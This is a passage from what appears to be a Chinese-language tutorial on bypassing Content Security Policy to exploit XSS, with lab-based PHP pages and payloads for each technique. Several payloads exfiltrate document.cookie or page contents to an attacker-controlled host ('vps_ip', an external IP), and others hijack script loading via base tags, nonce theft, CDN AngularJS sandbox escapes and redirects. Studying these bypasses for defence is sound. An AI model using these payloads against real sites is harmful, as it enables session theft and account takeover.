&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;var link = document.createElement(&amp;quot;link&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;link.setAttribute(&amp;quot;rel&amp;quot;, &amp;quot;prefetch&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;link.setAttribute(&amp;quot;href&amp;quot;, &amp;quot;//vps_ip/?&amp;quot; + document.cookie);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;document.head.appendChild(link);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3.meta 跳转绕过&lt;/p&gt;
&lt;p&gt;与 link 标签原理相似，利用 meta 标签实现网页跳转&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/csp.php?xss=&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;1;url=http://150.158.188.194:7890/&amp;quot; &amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;meta 可以控制缓存（在 header 没有设置的情况下），有时候可以用来绕过 CSP nonce。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;meta http-equiv=&amp;quot;cache-control&amp;quot; content=&amp;quot;public&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;外带 cookie&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var ometa = document.createElement(&amp;quot;meta&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ometa.setAttribute(&amp;quot;http-equiv&amp;quot;, &amp;quot;refresh&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ometa.setAttribute(&amp;quot;content&amp;quot;, &amp;quot;1;url=127.0.0.1:18888/csp.php?xss=&amp;quot;%2bdocument.cookie);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;document.head.appendChild(ometa);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;4.iframe 标签绕过&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;同源&lt;/strong&gt; ，当一个同源站点存在两个页面，我们称它们为 A 页面和 B 页面，假如 A 页面有 CSP 保护，而 B 页面没有，我们就可以直接在 B 页面新建 &lt;code&gt;iframe&lt;/code&gt;  用 js 操作 A 页面的 DOM，也就是说 A 页面的 CSP 防护完全失效&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- A页面 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (!isset($_COOKIE[&amp;#x27;a&amp;#x27;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        setcookie(&amp;#x27;a&amp;#x27;,md5(rand(0,1000)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        header(&amp;quot;Content-Security-Policy: default-src &amp;#x27;self&amp;#x27;;&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (isset($_GET[&amp;#x27;a&amp;#x27;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo &amp;quot;Your GET content:&amp;quot;.@$_GET[&amp;#x27;a&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- B页面 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (isset($_GET[&amp;#x27;a&amp;#x27;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo &amp;quot;Your GET content:&amp;quot;.@$_GET[&amp;#x27;a&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- 下面模拟XSS --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var iframe = document.createElement(&amp;#x27;iframe&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iframe.src=&amp;quot;http://127.0.0.1/a.php&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;document.body.appendChild(iframe);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setTimeout(()=&amp;gt;alert(iframe.contentWindow.document.getElementById(&amp;#x27;flag&amp;#x27;).innerHTML),1000);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;前提条件：主站需要有 xss，需要拿到分站权限&lt;/p&gt;
&lt;p&gt;5.CDN 绕过&lt;/p&gt;
&lt;p&gt;通过白名单中的 cdn 存在漏洞绕过 CSP&lt;/p&gt;
&lt;p&gt;hackmd CSP&lt;/p&gt;
&lt;p&gt;该 md CSP 政策还允许了 &lt;code&gt;https://cdnjs.cloudflare.com/&lt;/code&gt;  这个 js hosting 服务，这个提供了很多第三方的函数库以供引入，这样我们就可以直接借助 AngularJS 函数库以及 Client-Side Template Injection 里面成熟的沙盒逃逸技术绕过&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- foo=&amp;quot;--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;div ng-app&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&amp;#123;constructor.constructor(&amp;#x27;alert(document.cookie)&amp;#x27;)()&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//sssss&amp;quot; --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;6. 站点静态资源可控绕过&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;存在可控静态资源&lt;/li&gt;
&lt;li&gt;站点在 CSP 允许名单中&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;meta http-equiv=&amp;quot;Content-Security-Policy&amp;quot; content=&amp;quot;default-src &amp;#x27;self&amp;#x27;; script-src &amp;#x27;unsafe-eval&amp;#x27; https://www.google-analytics.com&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script src=&amp;quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;7. 不完整 script 绕过&lt;/p&gt;
&lt;p&gt;只适用于火狐，且只能&lt;?php echo $_GET[&#39;xss&#39;]?&gt; &lt;script nonce=&#39;xxx××&#39;&gt;相邻可以用，通过不完整的 script 标签将后面的 nonce 变为自己的属性&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://127.0.0.1/2.php?xss=&amp;lt;script src=data:text/plain,alert(1)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;script&lt;/code&gt;  就会被变成一个属性，值为空，之后的 &lt;code&gt;nonce=&#39;xxxxx&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;会被当成我们输入的 script 标签中的一个属性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可控点在合法 script 标签上方，且其中没有其他标签&lt;/li&gt;
&lt;li&gt;XSS 页面的 CSP script-src 只采用了 nonce 方式&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;需要将后面的没用内容注释，或者加到另一个属性中&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/2.php?xss=&amp;lt;script src=data:text/plain,alert(1)//&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;x http://127.0.0.1/2.php?xss=&amp;lt;script src=data:text/plain,alert(1) 123=&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;8. 不完整资源标签获取&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;meta http-equiv=&amp;quot;Content-Security-Policy&amp;quot; content=&amp;quot;default-src &amp;#x27;self&amp;#x27;;script-src &amp;#x27;self&amp;#x27;; img-src *;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php echo $_GET[&amp;#x27;xss&amp;#x27;]?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;h1&amp;gt;flag&amp;#123;0xffff&amp;#125;&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;h2 id=&amp;quot;id&amp;quot;&amp;gt;3&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以使用外联图片的 CSP，将 src 中内容延伸至下一个 &amp;quot;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/csp.php?xss=&amp;lt;img src=&amp;quot;//vps_ip?a= &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;baseuri 绕过&lt;/p&gt;
&lt;p&gt;当网站设置了 script nonce， 在无法猜测 nonce 值的情况下，且 base-uri 没有被设置。&lt;/p&gt;
&lt;p&gt;那么可以使用 &lt;code&gt;&amp;lt;base&amp;gt;&lt;/code&gt;  标签将文档的基础 URI 修改为自己的服务器地址。&lt;/p&gt;
&lt;p&gt;如下，需要本来文档就存在相对地址加载 js 的情况。最后 只要在自己服务器放上一个 123.js 就行了。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;header(&amp;quot;default-src &amp;#x27;self&amp;#x27;; script-src &amp;#x27;nonce-test&amp;#x27;&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;base href=&amp;quot;//xx.xx.xxx.xx:8888&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script nonce=&amp;#x27;test&amp;#x27; src=&amp;quot;/123.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;302 跳转&lt;/p&gt;
&lt;p&gt;网站都会带有一个 302 跳转功能的页面，用它来导向到本站的资源或者是外部的链接&lt;/p&gt;
&lt;p&gt;如果我们的 script-src 设置为某个目录，通过这个目录下的 302 跳转，是可以绕过 csp 读取到另一个目录下的脚本的。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a/csp.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- csp.php --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; header(&amp;quot;Content-Security-Policy: default-src &amp;#x27;self&amp;#x27;;script-src http://127.0.0.1/a/&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     csp header test &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a/redirect.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;header(&amp;quot;Location: &amp;quot; . $_GET[url]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b/text.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;title&amp;gt;1&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;csp 限制了 &lt;code&gt;/a/&lt;/code&gt;  目录，而我们的目标脚本在 &lt;code&gt;/b/&lt;/code&gt;  目录下则如果这时候请求 &lt;code&gt;redirect&lt;/code&gt;  页面去访问 &lt;code&gt;/b/&lt;/code&gt;  下的脚本是可以通过 csp 的检查的&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/a/redirect.php?url=/b/test.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但这是有一个很严格的条件的，加载的资源所在的域必须和自身处于同域下 (&lt;a href=&#34;http://example.com&#34;&gt;example.com&lt;/a&gt;)，也就是不可能通过 302 跳转去加载一个其他域下的脚本的，比如通过&lt;/p&gt;
&lt;p&gt;&lt;code&gt;a.com&lt;/code&gt;  的 302 跳转去加载 &lt;code&gt;b.com&lt;/code&gt;  下的脚本是不可以&lt;/p&gt;
&lt;p&gt;在实际环境中，比如某个站调用某个 cdn，或者类似于 &lt;code&gt;script-src example.com/scripts/ google.com/recaptcha/&lt;/code&gt; ， &lt;code&gt;google.com/script/*&lt;/code&gt;  下有个 &lt;code&gt;evil.js&lt;/code&gt; ，然后刚好站内有个重定向，漏洞条件就已经成立了。&lt;/p&gt;
&lt;ul&gt;
